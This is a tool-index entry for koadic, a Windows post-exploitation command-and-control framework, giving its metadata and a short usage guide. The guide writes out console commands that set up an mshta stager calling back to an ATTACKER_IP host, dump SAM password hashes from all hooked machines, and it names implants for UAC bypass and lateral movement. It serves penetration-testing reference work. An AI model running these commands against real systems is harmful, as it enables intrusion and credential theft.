---
name: "koadic"
categories:
  - blackarch-automation
version: "3.457f9a3"
homepage: "https://github.com/offsecginger/koadic"
packaged-by: [blackarch]
blackarch-builddate: "2026-01-13"
build-system: scripts
license: Apache-2.0
meta-checked: "2026-11-09"
github-repo: "offsecginger/koadic"
github-stars: 344
github-pushed: "2022-01-03"
github-archived: false
github-issues: 8
github-match: "exact"
gh-checked: "2026-11-07"
worth: 2.7
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# koadic

> COM Command & Control: Windows post-exploitation driven through Windows Script Host.

## What it's for

Koadic (COM Command & Control, originally zerosum0x0) is a Windows post-exploitation rootkit in the Meterpreter/Empire vein whose stagers and implants operate through Windows Script Host (JScript/VBScript), letting payloads be served and executed entirely in memory — with compatibility claimed back to a default Windows 2000 install through Windows 10. The operator drives an msfconsole-style shell: choose a stager to hook a "zombie" (mshta, regsvr32, rundll32, wmic, bitsadmin, or disk), then run implants for UAC bypass, SAM/NTDS hash dumping, LSASS minidumps, in-memory shellcode, lateral movement over WMI/psExec, persistence, and file transfer, over HTTP or TLS. It is a post-exploitation C2, not a scanner or an exploit framework — you still need a way to make the target execute the stager command.

## Typical use cases

### Start the C2 console

Launch the operator shell.

```
./koadic
```

Outcome: opens the interactive console (installed as `koadic` on BlackArch); `help` lists the core verbs (`use`, `set`, `info`, `run`, `zombies`, `exit`).

### Hook a zombie with an in-memory mshta stager

Serve a payload the target pulls via mshta.exe.

```
use stager/js/mshta
set SRVHOST ATTACKER_IP
run
```

Outcome: koadic listens and prints the one-line `mshta http://...` command to execute on the target; once it runs, the host appears in `zombies` as a hooked session. `SRVHOST`/`SRVPORT` (aliases `LHOST`/`LPORT`) control the callback, `KEYPATH`/`CERTPATH` switch the link to TLS.

### Dump local password hashes from hooked zombies

Run an implant against one or all sessions.

```
use implant/gather/hashdump_sam
set ZOMBIE ALL
run
```

Outcome: executes the SAM hive hashdump on every hooked zombie and reports retrieved password hashes; other implants in the same family include `implant/elevate/bypassuac_eventvwr`, `implant/gather/hashdump_dc` (NTDS.dit) and `implant/pivot/stage_wmi`.

### Replay a command script at startup

Automate a stager-plus-implant sequence.

```
./koadic --autorun cmds.txt
```

Outcome: the console executes the commands listed in `cmds.txt` (one per line) immediately on start — useful for scripted lab runs. `--restore file.json` resumes a previous session state instead.

*No corpus evidence — derived from upstream documentation.*
